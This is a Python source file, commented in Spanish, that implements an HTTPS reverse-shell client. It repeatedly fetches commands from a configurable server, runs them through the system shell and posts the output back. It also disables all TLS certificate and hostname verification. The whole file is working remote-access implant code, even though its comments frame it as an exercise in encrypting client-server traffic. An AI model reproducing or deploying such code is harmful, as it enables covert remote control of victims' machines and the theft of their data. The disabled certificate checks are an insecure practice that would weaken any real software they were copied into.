# Se va a cifrar la comunicación entre el cliente y el servidor HTTP utilizando HTTPS

import urllib.request as request # No se usa la librería "requests" para evitar dependencias adicionales
from urllib import parse # Esta librería es para parsear datos a enviar
import subprocess # Esta librería es para ejecutar comandos en el sistema
import time # Esta librería es para manejar tiempos de espera
import ssl # Esta librería es para manejar conexiones seguras SSL/TLS

# Se va a definir la dirección IP y el puerto del servidor HTTP al que se va a conectar el cliente

server_ip = "127.0.0.1" # Cambiar por la IP del servidor
server_port = 8080      # Cambiar por el puerto del servidor
server_url = f"https://{server_ip}:{server_port}" # URL completa del servidor HTTP

def run_command(command: str):
    """Ejecuta un comando en el sistema y envía la salida al servidor."""
    if command.lower() in ["exit", "quit"]: # Si el comando es "exit" o "quit", se termina la conexión
        print("[*] Saliendo...")
        exit(0)
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT) # Se ejecuta el comando y se captura la salida
    except subprocess.CalledProcessError as e:
        output = e.output # Si hay un error, se captura la salida de error
    # Se envía la salida del comando al servidor mediante una solicitud POST
    data = parse.urlencode({"response": output.decode("utf-8")}).encode("utf-8") # Se prepara la data para enviar
    ctx = ssl._create_unverified_context() # Se crea un contexto SSL que no verifica el certificado (para evitar errores con certificados autofirmados)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    request.install_opener(request.build_opener(request.HTTPSHandler(context=ctx))) # Se instala un opener que maneja HTTPS con el contexto creado
    try:
        request.urlopen(f"{server_url}/", data=data) # Se envía la solicitud POST al servidor
    except Exception as e:
        print(f"[!] Error al enviar la respuesta al servidor: {e}")
        time.sleep(5) # Esperar antes de reintentar en caso de error


# Se van a crear las instrucciones del cliente para empezar a ejecutar los comandos
while True:
    ctx = ssl._create_unverified_context() 
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    request.install_opener(request.build_opener(request.HTTPSHandler(context=ctx))) 
    command = request.urlopen(f"{server_url}/").read().decode("utf-8").strip() # Se obtiene el comando del servidor y se decodifica
    run_command(command) # Se ejecuta el comando recibido